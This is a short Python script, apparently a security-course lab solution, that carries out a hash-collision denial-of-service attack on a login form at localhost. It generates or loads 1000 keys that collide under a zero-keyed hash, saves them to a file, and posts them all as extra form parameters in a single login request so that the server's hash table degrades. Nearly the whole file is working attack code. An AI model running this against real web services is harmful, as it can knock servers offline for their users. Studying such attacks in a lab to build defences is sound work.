from requests import codes, Session
from collisions import find_collisions, check_collisions
LOGIN_FORM_URL = "http://localhost:8080/login"
hash_key = b'\x00'*16

#This function will send the login form
#with the colliding parameters you specify.
def do_login_form(sess, username,password,params=None):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	if not params is None:
		data_dict.update(params)
	response = sess.post(LOGIN_FORM_URL,data_dict)
	print(response)


def do_attack(record_file=None):
	col_keys=[]
	with open(record_file) as fp:
		for cnt, line in enumerate(fp):
			# print("Line {}: {}".format(cnt, line))
			col_keys.append(line.strip('\n'))
	print("already known: ", len(col_keys))
	sess = Session()

  	# Choose any valid username and password
	uname ="attacker"
	pw = "attacker"

  	# Put your colliding inputs in this dictionary as parameters.
	if (len(col_keys) < 1000):
		col_keys.extend(find_collisions(hash_key, 1000-len(col_keys), 25))
	with open('collision_keys.txt', 'w+') as f:
		for col_key in col_keys:
			f.write('{}\n'.format(col_key))
	check_collisions(hash_key, col_keys, 1000)
	attack_dict = {k: 0 for k in col_keys}
	response = do_login_form(sess, uname, pw, attack_dict)
	print(response)

if __name__=='__main__':
	do_attack(record_file='collision_keys.txt')
